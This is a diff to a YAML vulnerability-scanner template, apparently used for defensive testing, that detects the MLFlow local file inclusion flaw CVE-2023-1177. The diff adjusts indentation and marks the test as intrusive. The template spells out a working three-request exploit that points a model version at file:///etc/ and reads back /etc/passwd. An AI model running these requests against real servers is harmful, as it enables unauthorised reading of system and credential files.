@@ -2,7 +2,7 @@ id: MLFLOW_LFI
 info:
   name: "MLFlow Local File Inclusion"
   description: "This vulnerability allows attackers to exploit MLFlow by including and accessing local files on the server running the MLFlow application. This issue arises due to improper input validation, enabling attackers to potentially read sensitive files from the file system. It poses a security risk, especially in environments where confidential data or configuration files are stored locally on the server."
-  details:  "The MLFlow Local File Inclusion vulnerability occurs when an attacker manipulates file paths in the MLFlow web interface, allowing them to access local files on the server. This vulnerability is caused by improper handling of user input, particularly in file path parameters. Attackers can exploit this to read sensitive files, such as configuration files, credentials, or other critical system information, depending on the permissions of the running service."
+  details: "The MLFlow Local File Inclusion vulnerability occurs when an attacker manipulates file paths in the MLFlow web interface, allowing them to access local files on the server. This vulnerability is caused by improper handling of user input, particularly in file path parameters. Attackers can exploit this to read sensitive files, such as configuration files, credentials, or other critical system information, depending on the permissions of the running service."
   impact: "This vulnerability can have serious security implications. An attacker exploiting this flaw could gain unauthorized access to sensitive files on the server, potentially exposing critical information such as database credentials, API keys, and configuration files. This can lead to further system compromise, unauthorized access to data, or lateral movement within the network, depending on the severity of the information exposed."
   category:
     name: LFI
@@ -18,6 +18,8 @@ info:
     - CWE-22
   cve:
     - CVE-2023-1177
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -33,42 +35,42 @@ execute:
   type: multiple
   requests:
     - req:
-      - modify_method: POST
-      - modify_url: "/ajax-api/2.0/mlflow/registered-models/create"
-      - replace_body: '{"name":"abcdefgh"}'
-      - validate:
-          response_code:
-            gte: 505
-      - success: x2
-      - failure: exit
+        - modify_method: POST
+        - modify_url: "/ajax-api/2.0/mlflow/registered-models/create"
+        - replace_body: '{"name":"abcdefgh"}'
+        - validate:
+            response_code:
+              gte: 505
+        - success: x2
+        - failure: exit
     - req:
-      - modify_method: POST
-      - modify_url: "/ajax-api/2.0/mlflow/model-versions/create"
-      - replace_body: '{"name":"abcdefgh","source":"file:///etc/"}'
-      - validate:
-          response_code:
-            gte: 505
-          response_payload:
-            for_one:
-              key:
-                eq: "version"
-              value:
-                extract: versionVar
-      - success: x3
-      - failure: exit  
+        - modify_method: POST
+        - modify_url: "/ajax-api/2.0/mlflow/model-versions/create"
+        - replace_body: '{"name":"abcdefgh","source":"file:///etc/"}'
+        - validate:
+            response_code:
+              gte: 505
+            response_payload:
+              for_one:
+                key:
+                  eq: "version"
+                value:
+                  extract: versionVar
+        - success: x3
+        - failure: exit
     - req:
-      - modify_method: GET
-      - modify_url: "/model-versions/get-artifact?path=passwd&name=AJAX-API&version=${versionVar}"
-      - replace_body: '{}'
-      - validate:
-          response_code:
-            eq: 200
-          response_payload:
-            length:
-              gt: 0
-            regex: "root:.*:0:0:"
-            not_contains:
-              - <html>
-              - </html>
-      - success: vulnerable
-      - failure: exit          
+        - modify_method: GET
+        - modify_url: "/model-versions/get-artifact?path=passwd&name=AJAX-API&version=${versionVar}"
+        - replace_body: '{}'
+        - validate:
+            response_code:
+              eq: 200
+            response_payload:
+              length:
+                gt: 0
+              regex: "root:.*:0:0:"
+              not_contains:
+                - <html>
+                - </html>
+        - success: vulnerable
+        - failure: exit
